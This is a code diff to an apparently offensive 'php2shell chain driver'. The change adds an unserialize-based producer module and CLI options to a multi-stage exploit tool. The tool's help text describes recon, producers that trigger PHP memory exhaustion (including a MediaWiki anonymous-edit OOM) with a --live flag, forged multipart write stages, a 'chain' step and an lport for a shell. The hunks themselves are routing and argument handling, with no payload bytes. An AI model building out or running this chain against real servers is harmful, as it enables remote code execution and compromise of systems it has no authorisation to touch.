@@ -21,6 +21,7 @@ sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports
 from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
 from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
 from tool.modules import producer_modphp as modphp_producer_stage  # noqa: E402
+from tool.modules import producer_unser as unser_producer_stage  # noqa: E402
 from tool.modules import write_stage as write_stage_module  # noqa: E402
 from tool.stages import probe as probe_stage  # noqa: E402
 
@@ -85,15 +86,17 @@ def run_producer_step(
     path: str | None = None,
     memory_limit: str | None = None,
     sid: str | None = None,
+    producer: str | None = None,
+    unser_url: str | None = None,
 ) -> tuple[dict, Path]:
-    """Producer stage entrypoint, routed by the target's registered stage.
+    """Producer stage entrypoint, routed by producer module.
 
-    dry byte-build by default, --live to fire. Targets without a registered
-    producer stage fall back to producer_fpmwiki (the only receipt-laddered
-    stage at registration time).
+    dry byte-build by default, --live to fire. The module key is the TARGETS
+    producer_stage entry unless --producer overrides it (producer_unser on
+    modphp, producer_modphp first). Targets without a registered producer stage
+    fall back to producer_fpmwiki.
     """
-    stage_name = (profiles.TARGETS.get(target_name) or {}).get(
-        "producer_stage", "producer_fpmwiki")
+    stage_name = profiles.resolve_producer(target_name, producer)
     if stage_name == "producer_modphp":
         knob = memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
             "memory_limit_knob")
@@ -111,6 +114,19 @@ def run_producer_step(
             sid_bytes = sid.encode("ascii") if sid else modphp_producer_stage.DEFAULT_SID
             summary = modphp_producer_stage.dry(
                 host_header, body_bytes, output, knob, sid=sid_bytes)
+    elif stage_name == "producer_unser":
+        knob = memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
+            "memory_limit_knob")
+        if live:
+            if not unser_url:
+                raise ValueError(
+                    "--live producer_unser requires --unser-url: the module does "
+                    "not assume an endpoint path (lab unser.php is a separate build)"
+                )
+            summary = unser_producer_stage.fire(
+                unser_url, knob, output, timeout=timeout)
+        else:
+            summary = unser_producer_stage.dry(knob, output)
     else:
         summary = producer_fpmwiki_fire_or_dry(
             host, port, host_header, body_bytes, output, live, timeout)
@@ -486,10 +502,10 @@ def run_recon(
 def main() -> int:
     parser = argparse.ArgumentParser(
         description="php2shell chain driver: --step recon (read-only receipt), "
-        "--step producer (fpmwiki/modphp producers: offline byte-build default, "
-        "--live to fire), --step write_stage (dry skeleton: final forged "
-        "multipart bytes, no send), or --step chain (blocker-hold + rearm + "
-        "forged staged multipart)"
+        "--step producer (fpmwiki/modphp/unser producer modules: offline "
+        "byte-build default, --live to fire), --step write_stage (dry skeleton: "
+        "final forged multipart bytes, no send), or --step chain (blocker-hold + "
+        "rearm + forged staged multipart)"
     )
     parser.add_argument(
         "--target",
@@ -525,6 +541,19 @@ def main() -> int:
         help="producer: wpTextbox1 'A'*N size, int N (5.7M anonymous-edit OOM "
         "receipt; ladder 5.7M-6.0M fatal, 9M past the post_max_size ceiling)",
     )
+    parser.add_argument(
+        "--producer",
+        default=None,
+        help="producer module override for --step producer (producer_unser, "
+        "producer_modphp, producer_fpmwiki; bare names accepted); default: the "
+        "target producer_stage (producer_modphp stays first on modphp)",
+    )
+    parser.add_argument(
+        "--unser-url",
+        default=None,
+        help="producer (producer_unser) --live endpoint URL; no endpoint path is "
+        "assumed by the module",
+    )
     live_group = parser.add_mutually_exclusive_group()
     live_group.add_argument(
         "--live",
@@ -536,8 +565,9 @@ def main() -> int:
     parser.add_argument(
         "--memory-limit",
         default=None,
-        help="producer (modphp): server-side php memory_limit knob value "
-        "(overrides the TARGETS record; absence/128M is a pre-flight failure)",
+        help="producer memory_limit: modphp knob value (overrides the TARGETS "
+        "record; absence/128M is a pre-flight failure) or the producer_unser "
+        "class (2M / 8M / 128M; default: the target knob)",
     )
     parser.add_argument(
         "--sid",
@@ -567,6 +597,9 @@ def main() -> int:
         "for the disclosure window and reuse prior addresses on plain responses)",
     )
     args = parser.parse_args()
+
+    if args.producer and args.step != "producer":
+        parser.error("--producer only applies to --step producer")
 
     target_name = args.target
     url = args.url
@@ -613,17 +646,27 @@ def main() -> int:
         parser.error("lport must be between 1 and 65535")
 
     if args.step == "producer":
-        producer_stage_name = (profiles.TARGETS.get(target_name) or {}).get(
-            "producer_stage", "producer_fpmwiki")
-        producer_stage_module = (
-            modphp_producer_stage
-            if producer_stage_name == "producer_modphp"
-            else producer_stage
-        )
         try:
-            producer_stage_module.validate_body_bytes(args.body_bytes)
-        except (TypeError, ValueError) as error:
-            parser.error(f"--body-bytes: {error}")
+            producer_stage_name = profiles.resolve_producer(target_name, args.producer)
+        except ValueError as error:
+            parser.error(str(error))
+        if producer_stage_name == "producer_unser":
+            knob = args.memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
+                "memory_limit_knob")
+            try:
+                unser_producer_stage.class_record(knob)
+            except (TypeError, ValueError, NotImplementedError) as error:
+                parser.error(f"--memory-limit: {error}")
+        else:
+            producer_stage_module = (
+                modphp_producer_stage
+                if producer_stage_name == "producer_modphp"
+                else producer_stage
+            )
+            try:
+                producer_stage_module.validate_body_bytes(args.body_bytes)
+            except (TypeError, ValueError) as error:
+                parser.error(f"--body-bytes: {error}")
 
     if args.output is None:
         stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
@@ -656,8 +699,10 @@ def main() -> int:
                 live=args.live, timeout=args.timeout,
                 target_name=target_name, path=path,
                 memory_limit=args.memory_limit, sid=args.sid,
+                producer=args.producer, unser_url=args.unser_url,
             )
-        except (ConnectionError, OSError, TimeoutError, ValueError) as error:
+        except (ConnectionError, OSError, TimeoutError, ValueError,
+                NotImplementedError) as error:
             summary = {
                 "step": "producer",
                 "host": host,
